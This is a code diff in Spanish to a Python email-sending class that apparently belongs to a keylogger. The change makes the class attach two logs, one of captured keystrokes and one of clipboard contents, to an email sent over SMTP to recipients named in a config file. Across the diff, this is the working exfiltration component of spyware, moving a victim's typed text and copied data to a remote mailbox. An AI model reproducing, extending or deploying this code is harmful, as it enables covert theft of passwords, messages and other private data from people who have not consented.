@@ -16,15 +16,17 @@ class Enviar_Email:
     """
 
     # Constructor
-    def __init__(self, ruta_config: str, ruta_log: str):
+    def __init__(self, ruta_config: str, ruta_log_pulsaciones: str, ruta_log_portapapeles: str):
         self.__leerJson = LeerJSON(ruta_json=ruta_config)
-        self.__ruta_log = ruta_log
+        self.__ruta_log_pulsaciones = ruta_log_pulsaciones
+        self.__ruta_log_portapapeles = ruta_log_portapapeles
         self.__remitente = self.__leerJson.get_valor("remitente")
         self.__remitente_psw = self.__leerJson.get_valor("remitente_psw")
         self.__destinatarios = self.__leerJson.get_valor("destinatarios")
         self.__asunto_correo = self.__leerJson.get_valor("asunto_correo")
         self.__cuerpo_correo = self.__leerJson.get_valor("cuerpo_correo")
-        self.__nombre_log_adjunto = self.__leerJson.get_valor("nombre_log_adjunto")
+        self.__nombre_log_pulsaciones_adjunto = self.__leerJson.get_valor("nombre_log_pulsaciones_adjunto")
+        self.__nombre_log_portapapeles_adjunto = self.__leerJson.get_valor("nombre_log_portapapeles_adjunto")
         self.__puerto = self.__leerJson.get_valor("puerto")
         self.__dominio = f"smtp.{self.__leerJson.get_valor('dominio')}"
 
@@ -37,8 +39,20 @@ class Enviar_Email:
         correo["To"] = self.__destinatarios
         correo["Subject"] = self.__asunto_correo
         correo.set_content(self.__cuerpo_correo)
-        with open(self.__ruta_log, "rb") as log:
-            correo.add_attachment(log.read(), maintype="text", subtype="plain", filename=self.__nombre_log_adjunto)
+
+        # Adjuntar Logs al Correo
+        print("[-] Adjuntando Logs...")
+        logs = [
+            (self.__ruta_log_pulsaciones, self.__nombre_log_pulsaciones_adjunto, "Log Pulsaciones"),
+            (self.__ruta_log_portapapeles, self.__nombre_log_portapapeles_adjunto, "Log Portapapeles")
+        ]
+        for ruta, nombre_adjunto, nombre in logs:
+            try:
+                with open(ruta, "rb") as log:
+                    correo.add_attachment(log.read(), maintype="text", subtype="plain", filename=nombre_adjunto)
+            except FileNotFoundError:
+                print(f"[!] No Existe {nombre}")
+        print("[+] Logs Adjuntados Correctamente")
 
         # Prueba de Conexion
         try:
